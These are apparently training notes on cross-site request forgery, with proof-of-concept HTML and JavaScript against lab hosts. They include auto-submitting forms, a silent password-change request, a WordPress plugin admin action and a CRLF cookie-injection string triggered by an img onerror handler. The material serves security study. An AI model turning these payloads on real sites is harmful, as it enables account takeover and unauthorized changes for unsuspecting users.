## POCs 
### Portswigger
```html
<form method="POST" action="https://vulnerable-website.com/my-account/change-email">
	<input type="hidden" name="email" value="anything%40web-security-academy.net">
</form> 
<script> 
document.forms[0].submit(); 
</script>
```
### XHR req sample
```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>GOODCMS CSRF exploit!</title>
    <script>

        function runCSRF() {
            // It changes the password by sending the request to the server
            // But you cannot view the resulting response because of SOP
            let request = new XMLHttpRequest();
            request.onreadystatechange = function () {
                if (request.readyState == 4 && request.status == 200) {
                    console.log(`[*] Password changed to 'user'`);
                }
            }
            request.open("POST", "http://goodcms.lab:32224/change_pass");
            request.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
            request.withCredentials = true;
            request.send("password=user&password_repeat=user");
        }
        window.onload = function () {
            runCSRF();
        };
    </script>
</head>
<body>
</body>
</html>
```
### CSRF in a WordPress’s plugin( ajax )
```html
<html>
<title>Normal site</title>
<script src='jquery.min.js'></script>
<meta charset="utf-8"/>
<center>
    <br>
    <h1>Normal Site</h1>
    <br><br>
    <img src='troll.png' style="height: 70%;width: 40%;"></img>
</center>
<script type="text/javascript">

function exploit(){

    var targetUrl = 'http://owasp-class.lab:48010'
    var quizID = 1

	$.ajax(
	{
        url: targetUrl + '/wp-admin/admin.php?page=mlw_quiz_options&quiz_id=' + quizID,
        data: {'question_type': '0', 'question_name': 'Hacker man', 'correct_answer_info': '', 'hint': '', 'comments': '1', 'new_question_order': 2, 'required': 0, 'new_new_category': '', 'new_question_answer_total': 0, 'question_submission': 'new_question', 'quiz_id': quizID, 'question_id': '0'},
        type: 'POST',
    	xhrFields: {
           withCredentials: true
        },
        crossDomain: true
	});
	
}
exploit();
</script>
</html>
```
## Senarios
### token tied to non-session cookie 
(like when they use two *seperate frameworks* ) : [portswigger](https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-tied-to-non-session-cookie)
#### step1: csrfKey cookie injection 

> 1. `/?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR-KEY%3b%20SameSite=None`

#### step2: using img tag for delivering the crafted link

>1. `<img src="https://vulnerable-website.com/?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR-KEY%3b%20SameSite=None" onerror="document.forms[0].submit()">`
